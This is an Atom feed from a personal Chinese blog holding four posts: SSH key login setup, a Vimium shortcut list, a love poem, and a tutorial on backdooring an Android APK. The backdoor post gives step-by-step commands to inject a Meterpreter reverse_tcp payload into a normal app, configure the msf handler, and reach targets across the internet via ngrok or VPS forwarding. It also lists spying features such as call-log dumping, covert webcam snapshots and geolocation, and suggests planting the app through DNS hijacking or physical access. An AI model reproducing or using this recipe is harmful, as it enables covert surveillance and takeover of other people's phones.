<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XiaoTaoist&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-03-07T06:16:48.047Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>taoist</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SSH免密登录</title>
    <link href="http://yoursite.com/2018/03/07/ssh-keygen/"/>
    <id>http://yoursite.com/2018/03/07/ssh-keygen/</id>
    <published>2018-03-07T01:37:50.000Z</published>
    <updated>2018-03-07T06:16:48.047Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><hr><h2 id="SSH单密钥配置"><a href="#SSH单密钥配置" class="headerlink" title="SSH单密钥配置"></a>SSH单密钥配置</h2><ul><li>生成ssh密钥文件<blockquote><p>ssh-keygen -t ecdsa -b 521</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-t 为指定加密算法类型，支持rsa，dsa，ecdsa</span><br><span class="line">-b 指定密钥大小，ecdsa算法默认大小为256位</span><br><span class="line"></span><br><span class="line">ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车<br>ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。</p><ul><li>将公钥上传到远程服务器<blockquote><p>ssh-copy-id  username@remote_ip</p></blockquote></li></ul><p>ssh-copy-id会将你的刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中</p><ul><li>测试<blockquote><p>ssh username@remote_ip</p></blockquote></li></ul><h2 id="SSH多密钥配置"><a href="#SSH多密钥配置" class="headerlink" title="SSH多密钥配置"></a>SSH多密钥配置</h2><ul><li><p>生成密钥</p><blockquote><p>ssh-keygen -t ecdsa -b 521 -f  ~/.ssh/one   -C “remote_ip”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f 指定生成密钥保存位置与名称 建议放到 $HOME/.ssh/目录下</span><br><span class="line">-C 添加注释，类如邮箱，远程主机IP，用户名之类，默认为本机主机名和用户</span><br></pre></td></tr></table></figure></blockquote></li><li><p>将公钥上传到远程服务器</p><blockquote><p>ssh-copy-id  -i ~/.ssh/one.pub username@remote_ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i 指定上传公钥名称</span><br></pre></td></tr></table></figure></blockquote></li><li><p>创建SSH配置文件来管理多组密钥</p><blockquote><p>vim ~/.ssh/config </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host remote_ip1</span><br><span class="line">  IdentitiesOnly yes</span><br><span class="line">  IdentityFile ~/.ssh/one</span><br><span class="line">Host remote_ip2</span><br><span class="line">  IdentitiesOnly yes</span><br><span class="line">  IdentityFile ~/.ssh/two</span><br></pre></td></tr></table></figure></blockquote></li></ul><blockquote><p>Host后面写: 远程主机ip地址<br>IdentityFile后面写 你创建的密钥位置与名称</p></blockquote><ul><li>测试<blockquote><p>ssh username@remote_ip</p></blockquote></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><p>将本地文件上传到远程主机</p><blockquote><p>scp local_file remote_username@remote_ip:remote_folder  </p></blockquote></li><li><p>将远程主机中的文件下载到本地</p><blockquote><p>scp remote_username@remote_ip:remote_file   local_folder</p></blockquote></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.archlinux.org/index.php/SSH_keys" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/SSH_keys</a></li><li><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;========================&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;SSH单密钥配置&quot;&gt;&lt;a href=&quot;#SSH单密钥配置&quot; class=&quot;headerlink&quot; title=&quot;SSH单密钥配置&quot;&gt;&lt;/a&gt;SSH单密钥配置&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;生成s
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>生成apk后门实现msf控制安卓手机</title>
    <link href="http://yoursite.com/2018/03/02/backdoor-apk/"/>
    <id>http://yoursite.com/2018/03/02/backdoor-apk/</id>
    <published>2018-03-02T10:00:03.000Z</published>
    <updated>2018-03-07T06:20:55.566Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><hr><h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><ul><li>Kali Linux</li><li>android</li><li>同一局域网 </li></ul><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>安装依赖环境</p><blockquote><p>apt-get install lib32z1 lib32ncurses5  lib32stdc++6</p></blockquote><p>下载 backdoor-apk</p><blockquote><p>git clone <a href="https://github.com/dana-at-cp/backdoor-apk.git" target="_blank" rel="noopener">https://github.com/dana-at-cp/backdoor-apk.git</a></p></blockquote><p>下载完成后进入文件目录</p><blockquote><p>cd backdoor-apk/backdoor-apk</p></blockquote><p>将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行</p><blockquote><p>./backdoor-apk.sh test.apk<br>PS:test.apk 为事先准备好的正常apk应用名</p></blockquote><p>选择payload<br><img src="img/apk_1.png" alt="apk">  </p><p>出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件</p><h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>执行</p><blockquote><p>msfconsole -r backdoor-apk.rc</p></blockquote><p>手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell<br><img src="img/apk_msf.png" alt="msf"><br>可以看到获得反弹shell 会话<br>用sessions -i number  切换到当前会话<br>此处执行check_root 测试<br>其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等</p><p>可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload android/meterpreter/reverse_tcp  </span><br><span class="line">set lhost 192.168.0.105  </span><br><span class="line">set lport 8888  </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>[!] Failed to recompile original project with backdoor <ul><li>现在很多应用都会做一些处理防止反编译，可以上 <a href="https://apkpure.com" target="_blank" rel="noopener">APKPure</a> 或<a href="https://www.coolapk.com" target="_blank" rel="noopener">酷安</a> 去找一些历史版本会增加成功概率</li><li>apktools 过旧，可以把Kail 更到最新</li><li>一定要把 apk 放到backdoor-apk.sh 所在目录下</li></ul></li></ol><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul><li>外网环境可使用vps转发 或 ngrok穿透 参考<ul><li>vps 转发 <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li><li>ngrok穿透 <a href="http://www.freebuf.com/sectool/162046.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/162046.html</a></li></ul></li><li>植入木马方式<ul><li>内网dns劫持: <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li><li>物理接触</li></ul></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://www.secist.com/archives/680.html" target="_blank" rel="noopener">http://www.secist.com/archives/680.html</a></li><li><a href="http://www.4hou.com/mobile/8290.html" target="_blank" rel="noopener">http://www.4hou.com/mobile/8290.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;========================&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;实验环境：&quot;&gt;&lt;a href=&quot;#实验环境：&quot; class=&quot;headerlink&quot; title=&quot;实验环境：&quot;&gt;&lt;/a&gt;实验环境：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Kali Linux&lt;/li&gt;
      
    
    </summary>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Vimium 入门</title>
    <link href="http://yoursite.com/2018/02/28/Vimium-use/"/>
    <id>http://yoursite.com/2018/02/28/Vimium-use/</id>
    <published>2018-02-28T09:09:00.000Z</published>
    <updated>2018-03-07T06:21:13.700Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><h3 id="vimium-介绍"><a href="#vimium-介绍" class="headerlink" title="vimium 介绍"></a>vimium 介绍</h3><p>Vimium  是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升一定要试试这个插件。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb" target="_blank" rel="noopener">Chrome</a><br><a href="https://addons.mozilla.org/zh-CN/firefox/addon/vimium-ff/?src=userprofile" target="_blank" rel="noopener">Firefox</a></p><hr><h3 id="Vimium使用总结"><a href="#Vimium使用总结" class="headerlink" title="Vimium使用总结"></a>Vimium使用总结</h3><p><img src="img/vimium.png" alt="vim"></p><ul><li><p>页内浏览</p><ul><li>j:向下滚动一点</li><li>k:向上滚动一点</li><li>gg:到页面最底部</li><li>G:到页面最底部</li><li>d:向下翻一屏</li><li>u:向上翻一屏</li><li>gs:查看源代码</li><li>gi:聚焦到第一个输入点</li><li>i/Esc: 输入模式/命令模式</li></ul></li><li><p>快速选取</p><ul><li>/:快速查找 [n] 向下匹配项  [N]向上匹配</li><li>yy:拷贝当前页面的URL</li><li>yf:拷贝指定URL</li><li>V:选取指定段内容</li></ul></li><li><p>标签操作</p><ul><li>t:创建一个新标签</li><li>T:显示所有标签</li><li>J:上一个标签</li><li>K:下一个标签</li><li>x:关闭当前标签</li><li>X:恢复上个关闭的标签</li><li>r:重新加载  [F5]</li></ul></li><li><p>导航操作</p><ul><li>p/P : 打开剪贴板内的链接,否则进行搜索</li><li>o/O:从收藏夹、历史记录打开：如果你输的是一个网址，回车还能直接打开</li><li>f/F: 快速打开某链接</li><li>gf：跳到父页面</li><li>H:回退上一个历史页面 [&lt;-]</li><li>L:回到下一个历史页面  [-&gt;]</li></ul></li><li><p>浏览器快捷键</p><ul><li>ctrl+w: 关闭当前页面</li><li>ctrl+t: 新建标签</li><li>F6: 在当前页面输入URL</li><li>ctrl+d: 为当前页添加书签</li></ul></li></ul><hr><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>某些网站可能自带键盘映射，可为其单独设置 unmapAll 以恢复网页自带键盘映射。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;========================&lt;/p&gt;
&lt;h3 id=&quot;vimium-介绍&quot;&gt;&lt;a href=&quot;#vimium-介绍&quot; class=&quot;headerlink&quot; title=&quot;vimium 介绍&quot;&gt;&lt;/a&gt;vimium 介绍&lt;/h3&gt;&lt;p&gt;Vimium  是一
      
    
    </summary>
    
    
      <category term="Tools" scheme="http://yoursite.com/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>随笔・一</title>
    <link href="http://yoursite.com/2018/02/16/suinian/"/>
    <id>http://yoursite.com/2018/02/16/suinian/</id>
    <published>2018-02-15T17:09:01.000Z</published>
    <updated>2018-03-07T06:21:02.053Z</updated>
    
    <content type="html"><![CDATA[<p>===========================</p><p><img src="img/sui_1.png" alt="love"></p><blockquote><p>喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。</p></blockquote><p><strong>初心</strong><br>捡起一段坚韧的丝线，<br>串起断线的曾经。<br>抓住夏的尾巴，<br>将时钟拨到最初。<br>夏花灿烂那时，<br>是我们的开始。<br>贪念着空气里的丝丝香甜，<br>就这样静静地，<br>静静地望着你。<br>截一段甜到发稠的岁月，<br>缓缓流淌在时光里。<br>折一只小船，<br>轻轻飘荡到你的心房。<br>小船轻触你内心的柔软，<br>扒开你坚硬的外壳。  </p><p>原来你是最初的心动，<br>是夏日最绵软的清风。<br>我想如果我爱你，<br>可是我发现不是如果，<br>我一直都在爱你。  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;===========================&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;img/sui_1.png&quot; alt=&quot;love&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。&lt;/p
      
    
    </summary>
    
    
      <category term="随笔" scheme="http://yoursite.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
